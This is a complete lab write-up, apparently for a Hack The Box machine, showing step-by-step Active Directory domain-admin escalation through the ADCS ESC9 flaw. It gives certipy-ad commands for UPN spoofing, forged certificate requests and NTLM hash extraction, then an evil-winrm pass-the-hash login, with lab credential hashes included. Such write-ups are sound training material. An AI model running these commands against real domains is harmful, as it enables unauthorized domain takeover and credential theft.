# 07 - Privilege Escalation: ADCS ESC9 (Domain Admin)

Objective: Escalate to `Administrator` by abusing the ESC9 vulnerability in the `CertifiedAuthentication` template.

Concept (CPTS): ESC9 occurs when a certificate template uses the userPrincipalName (UPN) for identification and we have write permissions over an account that has enrollment rights.

Strategy:

1. **Spoofing:** Change `ca_operator`'s UPN to `Administrator`.

2. **Request:** Request the certificate (the CA will believe we are the Admin).

3. **Restore:** Restore the original UPN (to avoid breaking authentication).

4. **Auth:** Authenticate with the forged certificate.

## 1. Modify the UPN (Spoofing)

We use `management_svc` credentials (which has `GenericAll` over `ca_operator`) to change the victim’s UPN.

> **Note:** We add `-dc-ip` to avoid DNS issues.

```bash
# Syntax: certipy-ad account update -username [WRITER] -hashes [HASH] -user [VICTIM] -upn [TARGET]
# management_svc hash: a091c1832bcdd4677c28b5a6a1295584

certipy-ad account update -username management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn Administrator -dc-ip 10.129.25.158
```

- **Expected result:** `Successfully updated 'ca_operator': Administrator`.

![](<attachments/Pasted image 20260105133710.png>)

## 2. Request the Malicious Certificate

Now that the UPN says "Administrator", we request the certificate while authenticating as `ca_operator`.

```bash
# ca_operator hash: b4b86f45c6018f1b664f70805f45d8f2

certipy-ad req -username ca_operator@certified.htb -hashes b4b86f45c6018f1b664f70805f45d8f2 -ca certified-DC01-CA -template CertifiedAuthentication -dc-ip 10.129.25.158
```

- **Key result:** You should see `Got certificate with UPN 'Administrator'`.

- **File:** It will be saved as `administrator.pfx`.

![](<attachments/Pasted image 20260105133801.png>)

## 3. Cleanup (Restore UPN)

**Mandatory step:** Restore the original UPN immediately to keep AD stable (OPSEC).

```bash
certipy-ad account update -username management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn ca_operator@certified.htb -dc-ip 10.129.25.158
```

![](<attachments/Pasted image 20260105133847.png>)

## 4. Authentication and Hash Extraction

We use the forged certificate (`administrator.pfx`) to authenticate as Admin.

```bash
certipy-ad auth -pfx administrator.pfx -domain certified.htb -dc-ip 10.129.25.158
```

- **Result:** You will get the Administrator NTLM hash.

- _Example:_ `aad3b435...:0d5b49608bbce1751f708748f67e2d34`

![](<attachments/Pasted image 20260105133940.png>)

## 5. Final Access

```bash
evil-winrm -i certified.htb -u Administrator -H <NTLM_ADMIN_HASH>
```

![](<attachments/Pasted image 20260105134139.png>)
